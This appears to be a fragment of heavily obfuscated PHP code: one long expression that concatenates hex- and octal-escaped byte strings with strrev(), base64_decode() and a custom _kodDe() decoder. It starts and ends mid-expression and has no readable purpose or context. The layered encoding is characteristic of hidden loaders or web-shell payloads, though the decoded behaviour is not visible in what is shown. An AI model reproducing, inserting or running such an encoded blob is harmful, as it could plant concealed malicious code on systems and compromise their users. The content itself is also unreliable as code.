ac\x92\x7e\x5a\x15\x2c\x3a\xed\xc\x2a\x71\x30\xf4\x31\x93\xe6\x93\x73\x70\xd4\x68\x1a\xb8\x31\xe0\x5c\xd1\x58\xb8"."\x59\x68\x9c\xdf\xd7\x8\x7\xa6\xde\x69\x80\x44\x4e\x31\x15\x2d\xdb\xaf\x66\x54\xd8\x76\x93\xc5\xa0\x91\x4\xa4\x40\x23\x69\x90\x1b\x75\xa8\xba\x23\x35\xa2\xac\x23\x3e\xb2\xdc\x9\xfe\x8e\x28"."\x6f\xef\xa8\x77\x8d\xe8\xac\x71\xab\x3c\x8f\xbb\xd2\x55\x29\x8d\xaa\x18\x27\xb5\x2\xda\x44\x95\xd3\x12\xe9\x74\x41\x8a\xa\x29\x30\xed\x57\x6\x0\x1e\x5d\xc2\xb6\xb6\xd\x1d\x6\x6\xbd\xd3"."\xdb\xbc\xa1\x70\xa4\xd9\x1b\x6e\xa\xd4\x93\x1a\xbc\x1e\xf2\xe5\xd7\xf0\xd6\xa4\x3d\x6a\xc7\x3f\x9d\x2e\x8e\x8f\xc1\x9c\xfb\x32\x72\xd2\x86\xa5\x61\xa8\x59\xd3\x15\x2b\x84\x9f\x1a\x33\xd5\x38"."\105\343\60\330\244\250\311\24\351\237\12\113\213\151\151\115\227\323\20\213\321\105\254\120\314\222\124\23\144\176\60\302\344\201\220\232\311\121\274\146\246\362\231\250\360\111\311\122"."\60\337\364\170\111\151\354\170\323\164\362\125\345\46\11\207\215\152\240\230\331\35\32\15\376\161\64\34\327\62\62\245\166\21\112\122\342\30\47\141\320\10\113\114\223\42\363\363".strrev('‘ù@'."\r".'Â½¬lLœ’'."\n".'ô¢…):¤®2¶µRm'."\n".'’’diLÅf’KuB'."\r".'MÔÒ')."\252\32\101\220\23\22\122\64\74\23\322\273\34\140\262\244\151\160\232\4\242\135\140\273\20\112\102\65\32\204\303\77\242\241\70\320\170\231\247\157\325\225\204\112\66\135\26\314"."\x58\xb3\xac\x77\xd3\xc\x60\x86\xf8\xb1\x3\x3\x42\x61\xd\x6d\x7e\x7f\xa4\x2e\xd0\x12\x6\x34\x34\x86\xcc\xc\xfa\xc2\x5e\xba\x46\x3d\xf5\x11\x4f\x5d\x2b\x3b\x44\xf9\x8c\x93\x4\x10\x61\x14"."\x9e\x6\x18\xd2\x3b\x4a\x38\x89\xf8\x91\xc5\x91\x39\x3d\x6a\x21\xb2\xc6\xdf\x0\x3b\xe7\xb4\xac\xa1\x38\x63\xa4\xb4\x38\x47\xeb\x38\xc5\x24\x1b\x4e\x2f\xc8\xc1\x29\xf7\x7e\xa7\x9c\x19\x74\x66"."\xc0\x30\x39\x59\xd3\xad\x27\xac\x14\x16\xf\x6a\x1f\x99\x57\x8e\xbe\xe1\xc0\x2\xc6\x88\x1e\xed\xad\x81\x10\xc9\x50\x3\xa1\x80\x7a\x8a\x2a\x3a\x69\x47\x6b\x1b\x89\xca\x8\x6b\xaa\xd1\x4b\x80"."\x87\xd3\xd3\x5a\x26\xb4\x93\x67\x66\x88\xa2\xde\x3c\x48\xaf\xab\x83\x32\xef\x63\xd\x6d\xf\x29\xbb\x3f\x93\xe6\x4\xa1\xb5\x57\x4e\x3e\x17\xe1\x26\x5f\xcb\xb4\x48\x73\xa0\xde\xeb\x8f\xf8\x5a".base64_decode('AF4KF8LbWus9dHJFeG0g3GSBtgHMNMPj99mTe2f5QuFQ0SgAa/PaYgAv2Br0Nvhm').strrev('uğˆ5”" ab+J!zEÓÆ!±@úknÈ	"™§‹M<Mu<êE¯ëÏƒ`±').base64_decode('AI5Lhaw90l3IFaOeEBo9puXpamRkYoZilYxMtpVMj8Iy/FMueUKSmYsw/BEdYJ+o')."\33\64\14\10\102\122\277\104\320\175\101\13\42\60\115\255\222\140\230\273\70\300\223\60\31\26\260\205\301\276\340\161\140\6\74\210\375\6\53\1\315\110\204\356\65\3\360\53"."\x1e\xda\x9c\x4\x67\x7d\x23\x81\x56\x6f\xd0\x3\x19\xe7\xc8\xcc\x60\xa0\xa5\x91\x64\xe8\x4b\x29\xb4\x1\x3e\x32\xfc\x65\x94\x7c\x22\xfc\xb3\xc9\x51\x18\xa0\x7d\x64\xca\x42\xf1\x41\xef\xd2\xe8".base64_decode('UC7AP8PxDyD7SOVKlo56FGJzhhgoTwR2A8XEWp7VFtW0NN2ngAJg+IBx3l0GXST9')."\x14\xf9\x8c\xa4\x47\x1a\x39\x51\xc2\x81\x69\xde\x96\x8\x5d\x59\x38\x24\xac\x46\xc\x0\xbc\x6c\x20\x48\x6\xc4\xd4\xba\x29\x43\x85\x23\x83\xde\x10\xdd\xe5\xba\xd2\x93\x57\xe9\x70\xb9\x5d\x23"."\xc9\x2a\x56\xc0\xa1\x45\xaa\x77\xcf\xed\xe8\x1b\x59\xd6\xee\x1c\xe9\xea\x4\x1f\xe5\x23\xa6\xe2\x20\x9\x75\xb8\x2c\xc1\xa1\x24\x7f\x5e\x67\xb9\x21\x61\x54\x66\xd4\x94\x57\x75\xb8\x3b\xdc\x65"."\65\125\355\36\347\240\354\34\254\160\116\164\166\216\354\160\225\217\44\200\316\371\243\34\143\26\302\4\40\141\315\331\235\340\247\272\243\146\130\207\163\370\271\363\246\266\167\164"."\226\126\215\74\253\303\165\166\107\137\347\210\362\32\132\117\54\257\3\146\61\66\300\232\32\37\131\6\232\4\10\46\226\44\213\120\236\220\200\106\14\252\71\16\235\77\156\41".strrev('x#¨‹îØã>GÖO}Â²Æ{œãÎ–)¿ÀÄëÙ'."\0".'Ogdc³»G<’T9ƒ…')._kodDe('KEM2z1z4DPZKyFlqo/Lw7lcXbb6TyJpHRSw54JdrWqncBWA3i4ta6BSPl3NqCz1FqQ==')."\241\313\3\300\55\141\260\70\50\143\10\242\204\120\32\221\205\244\6\316\240\51\210\133\41\275\310\105\40\115\326\307\102\161\45\113\346\351\60\222\332\210\311\71\45\44\364\60"."\x12\x9\x7b\x6a\xfd\xde\x8\xc5\x30\x4\x13\xd3\x30\xc2\x8a\xb5\x4c\x6a\x7\xba\xc6\x31\x2a\xc5\xf\x31\x4e\xa4\x23\x7e\x84\xec\x7c\xa3\x27\x2d\x21\xc4\x20\x29\xba\xae\xe9\x55\x48\x3a\x69\xe4"."\163\220\230\3\274\227\11\306\126\2\214\273\124\75\105\302\103\116\362\105\304\11\310\311\224\162\200\274\264\100\15\100\14\105\332\224\343\63\144\0\22\214\322\103\356\262\216\216".base64_decode('fLsS72wHC192Jjrnj15YTul4dwf4jwY8RYRoEYYNI+B8dsF2MDmIJcCicVDTGdGU').base64_decode('s5DdpmbKaUsRYQihqIke3ERkgGfbzzEWPMoFGSRCpy1MwMYEIIL4C+YIKaaLpXAI')."\x91\x11\x10\x26\xfd\xc3\x7f\xab\x4b\x28\xb2\xcf\x82\xed\x54\x27\x1c\x75\x58\x7e\x13\x1a\x30\x4c\x25\x63\x11\x59\x1a\x8a\xac\xc7\x52\xd\xf9\x74\xda\x64\xc4\x7f\x5a\xed\x26\x35\x90\xbd\x32\xaf"."\x58\xda\x6\x4d\xa7\x4c\xee\x8\x52\x6f\xc9\x88\x62\x9\x7d\xd9\x2c\x60\x49\xc5\xb5\xc5\x4f\xd5\x46\xf\xa0\x5f\xc2\x52\x19\x15\xef\x49\xbe\x16\xa9\x36\x10\xf0\x7b\x3d\x2d\x12\x3c\xc0\xc9\xc1"."\3\250\203\220\267\325\3\116\55\310\56\207\302\136\42\161\364\325\73\151\271\263\234\76\302\120\261\17\65\116\347\11\40\73\223\102\211\300\213\204\40\175\351\200\262\35\7\244"."\42\34\240\271\16\310\54\71\70\115\357\340\22\63\107\257\252\364\241\17\106\132\73\10\305\355\60\145\35\20\3\220\44\46\237\276\172\207\152\324\43\166\2\125\200\242\150\203".strrev('z%ÁÕ+Rà9L~>…šCµf“ÕŞÄ²ƒ±m4ÚÒUé_œnå¤b”Ì')."\244\72\201\377\160\160\336\304\221\324\265\174\256\225\326\44\204\160\143\10\200\267\224\1\202\232\146\72\50\277\351\50\144\105\213\217\135\361\246\243\301\266\327\115\46\12\106\25"."\16\311\157\314\114\341\340\133\131\252\371\270\104\302\232\57\244\207\227\45\15\237\113\272\237\322\12\17\301\321\346\137\63\370\176\204\35\152\220\173\305\145\126\154\311\321\43\204"."\56\117\56\142\347\22\140\116\322\332\231\113\273\374\26\126\32\226\223\41\241\72\123\116\322\272\212\304\342\357\240\22\33\210\161\6\265\136\140\173\255\41\66\1\150\247\24\133"."\xe5\xc5\x27\x96\xad\x5c\x36\xf\x87\x1f\x76\x18\x1d\x48\xba\x9c\xd9\xa4\x5a\x76\xc1\x6f\xef\x3f\xd2\x13\x84\xce\x2\x39\x4e\x10\xe0\xc6\x42\x94\x1a\x2\x7\x54\x43\x5a\x26\x27\xd0\x28\x31\x9a".base64_decode('IFOHNQS3jwshV3TnEWLSCr+3ISydEwCISdUiOE8EJpbQHy0rWcqmwyVVo3gelrNx')."\14\231\7\260\366\274\352\22\132\111\211\45\73\137\13\326\106\70\150\120\52\134\135\160\270\305\101\200\347\20\352\76\77\151\50\50\300\17\266\74\241\342\144\203\360\123\120\110"."\x4d\xbe\x14\xa\xe3\x53\x2b\x2e\x3e\x34\xbf\x76\x0\x6d\x97\xa5\x5e\x18\xe4\x1b\x87\x2e\x9\x9\x56\xe0\x10\xe8\xe\x88\x3e\x9c\x7c\xb\x8\x41\xf2\x63\x1d\x79\xdb\xc2\xb4\x9d\x8a\x70\xa4\x5a"."\xd5\xec\x80\x9a\x15\x45\x55\x1c\xca\xf\x56\x7e\xae\xc3\x8d\x6c\x13\xae\xd5\xef\xeb\x1b\x9f\x16\x5c\x14\xe6\x20\x22\x32\x47\x5a\xcd\x76\xb\x67\x2e\x97\xc3\x80\xd6\xc3\xac\x42\xdb\x49\x49\xb6"."\226\123\114\112\72\335\6\30\373\210\155\43\223\205\237\222\165\76\246\24\343\300\155\317\5\200\60\11\17\12\311\22\162\57\247\71\54\171\4\274\141\230\3\264\365\342\247\265"."\x50\x1c\xac\xdf\x57\xa0\x89\xc9\x2b\x8a\x5\x45\x94\xa4\x1a\x7e\x30\x76\xc5\xbe\x51\x4f\xc3\x5a\xd1\x20\x94\xa2\xd1\x6f\xd\xad\x7f\x7a\xa9\x6d\x39\xef\x11\xc7\x5f\x46\x61\x84\xa0\x88\x8\x72"."\x0\x86\xa9\xac\xf9\x70\x3\x3d\xc\xd9\x3\x22\x3d\xd\x8e\x38\xdd\x5\x37\x53\x23\x3c\xb1\xc4\xc3\x82\x21\x77\x3\x9e\x8e\xe2\xa\xd\x29\x60\x17\x11\x8\x2f\x2d\x54\x10\x27\xa6\xe6\x32\x20"."\x78\x10\xf0\x83\x83\x8e\x3c\xdf\x97\x7c\x36\xf8\x26\xb4\x2c\x9c\x24\x6f\x69\x1e\xa4\x88\x14\x36\xa\x2e\xfe\xe2\xe1\x6\x5d\x63\xa4\x2e\xa3\x3\xec\x89\xea\x10\x2f\x69\x8a\x43\x2f\x1c\xe2\xc2"."\x40\x59\xe8\x8d\x2\x90\x90\xc7\x4e\x79\xd8\xa0\xb6\xa0\x7d\xbc\xc9\x51\x85\x41\x54\xd2\x2c\xc7\x33\x6a\xd6\xa5\xe3\x43\xcf\x5\x38\x4\x72\x67\xec\xa8\x10\x48\x32\x8e\xa9\xe6\x1b\xe8\x68\x21"."\207\344\102\333\2\60\65\15\260\235\272\113\7\65\363\6\21\242\77\317\246\241\223\264\12\25\305\323\11\310\22\305\370\65\312\300\302\375\357\215\253\46\204\300\123\116\243\342".strrev('µ0Ë #pİ†G‚_ÆĞ¼4uø«³§@w¨ìYIfïA8`¤C¢û0e·¸Pi')."\x8f\x11\x82\x38\x5a\x88\xe2\x85\xa\xa9\xd8\x40\xa3\x76\x80\xa5\x1e\x47\xf4\x2b\x1f\x28\x94\x96\xe4\x45\xcc\x2d\xde\x4d\xae\x34\x48\x21\x5c\x9b\xf8\xea\x3d\xba\x4e\x97\xf\xee\x1c\x94\xa4\x3"."\240\10\202\170\51\104\327\176\261\203\6\27\356\355\345\272\31\270\50\130\261\13\357\104\227\34\217\7\250\144\133\374\56\114\52\12\372\212\27\204\324\145\130\121\102\250\170\162".base64_decode('TzrNL9Ht4X1mwZtOzCRC9pmtAXGW9LarGIzxHCJBbSWguUqDndC24tJ9Ux/7QDZ8').base64_decode('QouHwUldl1KzisEOXN0ohjv+P5O5hXMA98q+Fg6ME4TDugIB4unKJKAcNQkEBDqM').base64_decode('I6aF9AmiMoTNY1kPYLPiPsPjwRcAm7H4CrWnU6gMGOG5fnbEiZnAioJ0077KpNGs').base64_decode('KE5kfb3l0t2X/Ii/N79C+hYf6M32kXLA3/0X/A5/cz29S2bN17Y+d2zjBXvnd8x9')."\156\343\225\346\165\253\116\134\61\267\147\335\31\217\56\130\247\124\177\376\104\307\362\263\227\155\13\336\345\325\313\165\325\227\375\345\260\167\207\337\130\23\274\53\165\370\30\357"."\xe2\x71\xa9\xb\x86\xa4\x96\x1e\xf1\xf\xc9\x73\xdc\x37\x5b\xde\x4a\xee\x6c\x37\x7d\xaf\xb9\x7c\x3f\xdc\x72\xca\x85\x2f\xde\xba\xf0\xd5\xd7\x7e\x49\xec\x18\xbf\x61\xe4\xeb\xc3\xab\xce\xfd\xe9"."\47\355\274\57\277\70\363\370\245\207\174\353\54\35\130\161\353\362\131\43\66\175\166\367\372\241\27\155\30\76\142\335\363\375\307\176\162\376\220\266\364\61\147\16\277\164\363\312"."\23\236\272\157\331\212\252\45\107\255\12\134\336\274\154\163\340\335\27\376\363\334\312\25\117\316\357\235\360\260\376\345\35\43\177\70\357\372\223\163\347\174\277\142\121\272\375\260"."\x3\x3f\x1f\xd9\xb0\xab\xeb\xf2\xf4\xd5\xd7\x3c\xde\xba\x60\xdc\xd6\x27\xb6\x5f\xdf\xad\xbe\x55\x92\x5d\xf1\xea\xa2\x96\x78\xeb\x94\xd6\xb3\x57\x4e\xf3\x3c\x7b\xcd\x1f\xfe\xf8\xd9\xb5\x6d\x37".base64_decode('fnne5DO+33zW8YuPe/ek9Re2Ks037f4ptfqgR+/++IG//u2XI+854trWXfMm3tx9')."\x52\x5f\xe3\xf3\xef\xbf\x18\x9e\x78\xc6\x77\xc7\xfd\xed\xf4\x97\xdf\xfe\xea\xbe\x5d\x37\x7f\x70\xfa\x43\x6b\x37\x2f\x7e\xea\xfb\x33\xe\xfb\xeb\xf5\x53\x6e\x2b\xff\xfd\x1d\xcb\xef\xbd\xec\xe1".base64_decode('DwYeDl8z/eMn2/q/eXPSS+1bHjx4cjrfvPuRc96fOnbz3O9q57yZm73spUOHbn6w')."\x63\x57\xf5\x49\xbd\xd7\xdd\xf8\xe2\xf1\xfe\x2d\x2d\x91\x1f\x9f\x7d\x76\xdb\xc2\xbe\x8a\xf7\xd4\xa3\xae\x7f\xa0\x4c\xdb\xf2\xaf\xe8\xb0\x4f\x17\x85\xdb\xee\xe\x96\x4c\x5c\x71\xb3\x71\x58\xdb"."\366\71\263\273\316\337\120\362\350\320\123\203\315\313\336\256\37\365\374\372\304\133\143\337\156\75\166\111\345\177\37\276\141\106\150\354\43\63\66\35\167\371\372\271\47\167\325\255"."\175\373\263\123\36\370\174\325\75\353\35\155\43\362\155\153\366\13\237\174\376\25\311\41\163\207\134\176\342\307\45\57\310\303\52\332\16\74\371\17\327\275\65\147\354\350\17\206".base64_decode('H3n10tY3c/s9N6X92IcvWLEuvSs45MWN2yofPODdh9M9zw//04yn5r597Xvp4de9')."\166\355\225\357\154\16\334\76\167\303\162\337\136\371\323\177\55\257\32\174\370\212\163\224\243\132\6\377\372\321\376\47\126\315\76\344\370\111\317\316\312\237\164\325\376\177\365\274".strrev('š/ŸiİTy_›'."\r".'²èv_İÜ?¢å8Ú9™Ëuxš_Àú$şı¹}2[´ì¿—')."\247\55\336\177\355\321\117\270\116\336\60\171\314\263\7\226\114\276\141\361\346\253\214\163\236\114\277\262\253\373\361\304\212\366\112\165\317\364\103\132\236\77\346\225\43\157\174\62"."\x76\xc8\xec\xbd\xe6\x17\x3d\xee\x37\x4e\x7f\xf9\xd6\xe5\x37\xfd\x31\xfb\x5c\xc7\xb\xa7\x1e\x57\xfb\xe6\x81\xa1\x33\xb7\xae\x2c\x5d\xf0\x46\xfd\x94\xdb\xae\x3b\xf0\xbd\x75\xb3\x4f\x5b\xbe\xee"."\xe9\x57\x36\x94\x2f\xdf\x18\x3d\xb7\xab\x6b\xcf\xec\xf5\xaf\xdd\xb3\xbe\x7f\xe0\x95\x35\x4f\x35\xa6\x6f\x8d\x48\x97\xcd\xb9\xed\xc6\x92\x2a\xa3\xf7\xf4\xe9\xef\x9d\x3d\xe5\x3f\x53\x52\x4b\xef"."\356\76\356\256\232\165\117\76\232\221\277\133\337\77\157\342\220\33\177\114\275\163\301\155\237\375\141\334\336\365\25\243\47\75\276\243\362\235\167\226\337\132\175\356\214\367\36\255"."\xfc\xe4\xac\x67\x87\x4e\x5b\xe4\x9f\xfc\xe0\x7b\x3\x73\xf5\xdb\x37\x8d\x5a\xb6\xf8\xc7\xd1\xc3\xff\x30\x6a\xe5\x55\xd7\x9c\xb6\x7f\xe2\x93\x7f\x76\x3e\x7f\xe7\x67\x3b\x9d\xf\x9f\x3a\xec\xca"."\xe6\xdb\xff\xb4\x69\xc5\xb\x37\x79\x5f\x4c\xfc\x34\x75\xbf\xa\x69\xe5\xda\x8f\xf\x7b\x67\xc1\xfe\x3f\x2c\x89\x5f\xa8\x9a\x75\x9b\x26\x1d\x3c\xe3\xdc\xad\xef\x2c\x91\xff\x76\x6c\xdf\xba\xb3"."\374\215\317\117\275\174\171\346\315\165\337\36\365\126\346\205\261\237\234\362\316\221\103\66\134\77\147\117\372\200\75\311\333\377\361\132\346\206\47\353\276\171\261\371\260\376\257\37".strrev('š]ÿu²²æ°¿Òöw_ÖÊ[qæîyê.‹1Õtd}¾3ÔÁrˆ_3%‰í<_š¦Š')."\253\77\276\361\231\45\55\276\271\257\326\277\70\41\364\176\305\115\316\67\57\335\366\161\356\226\57\376\74\374\347\107\365\267\226\357\121\136\175\366\343\203\172\206\374\264\377\226"."\273\77\273\315\163\131\343\376\153\146\236\360\171\127\311\145\17\255\376\327\252\247\273\257\171\357\372\343\333\127\337\262\340\350\337\355\30\353\271\342\264\63\37\137\377\367\257\107"."\x3c\xf1\x7b\xf9\x98\xcb\x3e\x8e\xde\x71\xe2\x6e\x4f\x67\xf7\x49\x27\xac\x9e\xb3\xf5\x9f\xbe\x13\x57\xee\xbf\xac\x6d\xdd\x98\xd2\x37\xae\x3d\xf6\xc2\x7b\xb7\x7f\x74\xcb\xd4\x95\xfe\x3b\x5a\xff".strrev('ë?,JÍæüepÜ7¦/ÍınqúÛ)íw«kŠ—ş¾‹‘Êq¾V_¢õ¸Ş©%áŞñ')."\xce\x45\x73\xee\x1b\xf3\xc6\xfe\x9f\x3f\x38\xb5\xfe\xc2\x9d\xff\xbe\xfd\x26\xf9\xf1\x92\x55\x8b\xa2\xfe\xbb\x76\x5f\xff\x44\xb2\xfe\xcb\x55\x13\x8e\xaa\xd1\xf7\x8c\x79\xf1\x7b\x9f\xde\xda\x32".base64_decode('/I7vvrnvASm5+4/Drn7zfOfdW3ctOmHZ8h/i4yb8KXj7/rMevaZz4IAFB3YfsfZd')."\307\246\273\272\36\136\76\173\364\342\123\16\156\272\341\201\357\77\75\375\322\307\274\127\366\167\77\127\322\74\147\311\13\53\116\335\160\305\237\176\170\70\222\275\142\313\135\343"."\xfd\x6f\x6d\xdc\xd5\xdd\xe9\xa8\x6f\xbd\xeb\xfd\x31\xff\x5c\xbc\xea\xeb\xd7\x7e\x5c\x34\x77\xe9\x84\x9\xe7\xac\x1e\x6f\x4e\xba\xe9\x8e\x9f\xfa\x4f\x1f\x68\xfe\xf7\xe9\x75\x6f\xf8\x7\x56\x6f"."\371\171\317\232\327\136\175\376\212\177\377\155\162\331\201\276\212\271\343\116\373\176\326\115\16\63\120\371\316\133\353\326\354\276\314\135\76\371\146\245\144\330\372\173\377\274\165\310"."\336\205\237\74\263\237\121\267\370\220\263\137\237\26\170\366\224\213\342\201\251\261\307\147\35\133\135\172\330\230\245\173\177\226\33\47\176\172\125\351\205\67\375\270\371\257\123\16"."\xf9\xfe\x3\x73\xf0\xae\x25\x4f\x3c\xb5\xe7\xb1\x49\x7\x1f\xe5\xdf\xb6\xfe\x96\xc1\x6f\x8f\x2e\xd\xed\xb8\xfa\x9c\xf9\x6b\xf3\xfd\x9b\x4f\x8f\xf7\x1c\x72\xfe\x89\xc7\x3e\x3f\xfc\x81\x59\x13".base64_decode('p/7n+G63tPWDaUHvw75DGzef+9+XFp6e/yZknNE34/5xQ7etDn/xxEfPX9B4ZOea')."\27\272\16\333\74\374\244\211\367\376\376\321\73\156\375\162\370\66\365\230\314\123\47\274\42\357\30\22\33\276\53\333\160\377\331\177\67\316\167\75\264\372\356\373\276\372\172\244".base64_decode('76cPpi13td33yJb2LW7tqSP3VtatvfCl4Orpa5N3Zi5dPfjqbHn2P7/9fGbgtp+/').base64_decode('2jnzjz9/u/vTSTeed+7OLVdPeXrwx28euf+eSOeCr69e3Fdz7t5PI66aHz7/+rtn')."\x36\x9f\x74\xc8\x8d\x3f\x27\xd6\xbd\xd9\x5e\x33\xe3\xe7\x49\x35\x2f\x9e\xd2\xee\x93\xaf\x79\xb8\xb6\xe4\x94\xd3\xf6\xec\xb8\xe6\xf0\x95\xf7\xee\x8a\xbe\xf4\xdf\xd8\x7\x57\x7e\x74\xd0\x47\xb9".base64_decode('hUffH3w83LVj6ZV3eB0n11Z/0jG25PL96s48xtM8ZGn9y3Pnj3784iX66ou1J4e+').base64_decode('3fDu5CueaP9q+K3f9I77RjnozaFP56/6j9L4xoqDsyvXPVjT9PUZ+9/5+QMVD+34').strrev('+‡Ìı>2ĞÎÛÈ÷y8N_äwµ}?İóû³“Ö~¬¾ÒxÜ7%®ç».K—õòª')."\314\131\116\163\160\131\144\144\356\200\215\365\345\57\177\72\357\363\236\327\27\377\143\316\173\167\235\272\375\312\103\127\34\377\372\365\145\306\223\123\352\172\313\34\247\376\343\370".strrev('ø`ØörûnïøzÛöŸß'."\0".'ú¼?ÓşíÔø½®óİYúô“FéÄá»ßC£Òg³x¸îoÔ‹')."\137\235\213\162\147\274\374\310\256\213\113\316\374\346\340\237\66\227\335\161\171\172\345\230\377\334\63\173\364\131\137\137\170\335\306\151\317\35\364\360\13\273\66\374\307\343\277\351".base64_decode('qtsav3e998qEi3b3n3zIpBFHbIzeOqHiohcf9i7bnjDuO+GbW82el+9+5ZOcc9je').strrev('½Ìí»èVø^ß¯ÿ—áJ/İÒû^ï£Ù=9Ş7ôÈù ñíW}ÇøõgyWÎï')."\xb5\xe6\xa6\x8b\xef\xdc\x9b\x1a\xf6\xc5\x91\xdf\xbd\x7e\x6a\x5b\x63\xe7\x98\x7b\x2e\x92\xe7\xbf\x35\xf2\x87\xea\x9f\x1e\xab\x3f\x73\xb2\xe3\xc4\x5b\x36\xea\x8f\x9c\xf4\x65\xef\x3d\x57\x6c\xfa".base64_decode('Ip/umPXWtD2/zM30pf/x1aHnf9zvaV49Zvs5p9/+xgL1p73L3vv0sPNj28qmdz03')."\xf2\xbe\x7\xbb\x3c\xe7\x6f\xbc\xeb\xf8\xec\xb2\xbb\x5b\x96\x2e\x9d\xf7\x68\xe7\xe0\xe2\xa1\x17\x6f\x3d\xe9\x81\xc1\x2b\x4e\x32\xd7\x5d\x33\xed\xe3\x3f\xf\x6f\xb8\xe3\xdc\x74\x69\xf5\x25\x97"."\335\360\313\256\41\107\374\373\310\326\262\165\257\334\32\62\27\35\360\352\137\46\77\75\153\327\163\33\176\334\173\377\324\113\347\75\277\352\223\45\347\174\166\134\242\355\351\21"."\xa7\x19\x43\x2a\x3e\x7a\xa4\xfd\xa3\xe7\x37\x3c\xb2\x69\x43\x45\xfd\x9c\x39\xeb\x46\xff\x70\xc8\xb\x7f\xbc\xe7\xa5\x51\x6b\x76\x1f\xd7\xf3\x78\xd7\x4d\xab\x37\xff\xfe\xe4\xb5\x5b\x43\xb7\xce".base64_decode('e/TlhPt3n+oXdky6KnF08F35sxcAh5a6fPUN2x+tPWNivuHbUc47mmd13ucJLT5i')."\xfb\xaa\xbf\x5f\xf2\xe2\xdc\x8a\x57\x4e\x3b\x7b\xe2\x1b\xff\x78\x64\xe3\xce\x55\x9b\xfe\x5a\x31\xfd\xd0\x9b\xcd\x4b\xdf\xbb\xf7\xa4\x4f\xf7\xcc\x7f\xe8\xcd\x6f\x93\x6b\xbe\x5f\x67\xfc\xfc\xec"."\141\163\173\226\57\271\363\350\225\123\326\316\273\142\372\135\233\36\272\162\342\361\177\270\261\326\265\156\323\5\47\34\177\162\342\275\7\332\67\126\154\252\277\371\30\143\136\105"."\176\307\21\155\247\354\367\356\145\227\14\171\154\302\31\73\206\356\351\234\254\304\203\327\14\333\265\356\203\326\356\323\127\357\11\76\365\347\17\43\117\77\324\136\165\346\364\37"."\246\237\164\306\265\113\227\336\372\257\123\207\255\135\64\364\376\236\165\317\174\130\65\147\363\264\233\313\336\227\265\217\313\167\274\73\357\342\150\145\327\256\243\337\357\214\345\177"."\xff\xd1\xd5\xd5\x9e\xfb\xf6\xbc\xff\xe5\x37\xdb\x76\x7c\xf1\xc5\xf3\x57\x5f\x50\x79\xd7\xf7\x33\xdf\xba\xa6\xed\xb1\x97\x4a\x36\xfc\x32\x78\xe0\xff\xf2\xcc\x5b\x7c\x4c\xfc\xe4\xee\x8d\xcf\xde".base64_decode('vGTD724edcfGrU1fn/Z1rPT1O7dNH7l9XueOLyq/XLR36M6Tzp5yhP78oS982PSH').strrev('sÄ}#¬b@Ïb~^ÿ[ÅÆTóì±Çğòşäpz%9,·óçì¿î§·%ˆõ¨8‡')."\327\235\373\230\174\314\326\157\377\272\275\361\274\363\366\156\273\77\371\314\317\377\335\375\162\144\356\223\337\175\273\361\274\163\215\257\176\71\344\306\57\153\6\366\136\172\336\271"."\77\175\165\351\211\201\247\227\244\336\174\173\322\231\235\277\174\266\142\327\167\257\376\321\125\363\323\266\257\237\355\163\237\373\363\23\213\217\376\340\211\377\376\250\315\214\54\370".base64_decode('8cPzzrvtmPKPAr9vu2POOPXJ18p23XTJnflrk6+192lPHTr+1d3vdqjffPLZfw99')."\264\151\323\352\133\173\357\331\262\345\375\317\276\374\360\314\323\116\373\375\325\15\133\137\374\346\373\155\177\173\166\374\31\147\265\275\371\120\345\350\325\157\76\376\305\143\33\332".base64_decode('v9//qNeX3f/twL0d1973yOCd5Sfu+eWYBw7+7vfqfqvOb126MfbVxPYFB1z27cuj')."\374\337\37\174\315\11\17\175\261\143\375\131\76\345\344\277\165\276\166\363\356\217\26\375\127\76\156\324\314\43\167\154\275\342\354\277\37\160\332\333\307\175\370\370\220\311\77\337"."\73\144\323\356\251\377\331\64\271\52\371\305\365\145\377\256\271\372\322\66\255\341\144\152\121\222\310\165\365\365\153\104\146\110\264\221\52\211\166\224\62\140\244\223\75\104\314\113"."\24\347\373\223\332\200\252\23\311\310\350\121\44\145\257\234\215\345\15\162\107\336\245\366\31\75\3\44\240\345\163\261\144\37\241\304\307\340\237\250\51\3\66\203\44\30\73\216".base64_decode('/BIxhNwXH0iQ9owfT2rtTScHeoxBwqLElUw6SSuTB8ysTjiTCROIEl42OZCXqZLH').base64_decode('2AmkXiLhj0XzcmKANGkc7UJXJp2I9xHhwYRxE0kLRlH96HivMjhAbigzsbzSN0Au')."\225\7\173\265\134\167\206\214\322\50\332\202\161\243\110\323\107\115\244\220\361\244\250\11\25\244\75\152\377\140\157\76\116\165\312\7\14\60\120\204\367\32\67\232\214\312\104\72".base64_decode('LAOJ/gyVvUcHU11qnsosovneeI4MmCJHtcE46YQ2oERjKRKQk+lsf440OaamerK9')."\x83\x74\x12\x49\x5f\xf3\xe9\x8c\x1c\x4d\x91\x71\xed\x4e\xe6\x62\x3\x29\x22\xe\x9e\x48\x9b\x43\x47\x72\xe2\xe8\xf1\x84\x5b\x8e\x47\x95\xac\x4c\x8a\x8d\xea\x5d\x7d\x39\x85\x54\xd8\x9b\x49\xc6"."\330\165\303\370\61\144\151\15\146\15\131\357\46\143\77\272\202\364\56\337\325\67\60\30\45\320\301\144\64\141\346\351\100\214\245\53\40\226\351\326\250\32\161\102\317\344\123\71"."\x32\x19\x83\xd1\xe4\x40\x22\x4d\xb4\x2f\xc6\x4e\x1c\x45\x5b\x48\x46\x3b\x9b\x1f\x4c\xa4\xe9\xe5\xba\x66\x26\x53\x7a\xf\x11\x1\x77\x75\xf7\x6b\xa\xb5\x57\x18\x33\x8e\x64\x1c\x35\x86\xd4\x38"."\x76\x3c\xe9\x63\x2c\x61\xf4\x24\x75\x32\x5a\x46\xce\x1c\x88\xc6\x63\xb4\x36\xd2\x81\xc1\x9e\xbe\xd4\x80\xdc\x45\x4a\xa8\x20\x19\x7b\x7\xf4\x78\x74\x90\x4a\x5d\xba\x7a\x4c\x95\x2a\x7f\xf4\x98"."\xfd\x83\xdd\x71\x32\x69\x63\x2a\xe9\x64\x8f\x19\x4f\x37\x41\x26\x9a\x4d\x91\x4d\x36\x71\xfc\x28\x5a\x1b\x19\xc4\x68\xac\x47\xcd\xe5\xd3\x34\x7a\xc\x9d\x9b\xa\xca\xc2\x27\x73\xdd\x71\x6a\x7".strrev('´	ÊÊæ™îŞé="„MÓ×Öªj¡èÔJİSºXã$±ÊçXÉƒ]³'."\n".'¢í